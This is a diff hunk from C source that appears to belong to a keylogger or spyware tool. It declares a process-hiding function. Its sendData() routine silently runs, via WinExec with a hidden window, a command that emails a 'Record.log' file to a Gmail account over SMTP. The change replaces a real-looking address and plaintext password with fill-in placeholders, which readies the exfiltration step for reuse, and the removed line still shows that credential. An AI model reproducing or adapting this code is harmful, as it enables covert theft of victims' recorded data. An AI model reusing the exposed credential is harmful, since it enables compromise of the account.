@@ -34,7 +34,7 @@ char* getRandomName();
 void hideProcess();
 
 void sendData() {
-    const char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"comradzephyr@gmail.com\" --mail-rcpt \"comradzephyr@gmail.com\" --ssl -u comradzephyr@gmail.com:hudaisthebest9 -T \"Record.log\" -k --anyauth";
+    const char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"putyourshere@gmail.com\" --mail-rcpt \"putyourshere@gmail.com\" --ssl -u putyourshere@gmail.com:putpasswordhere -T \"Record.log\" -k --anyauth";
     WinExec(command, SW_HIDE);
 }
 
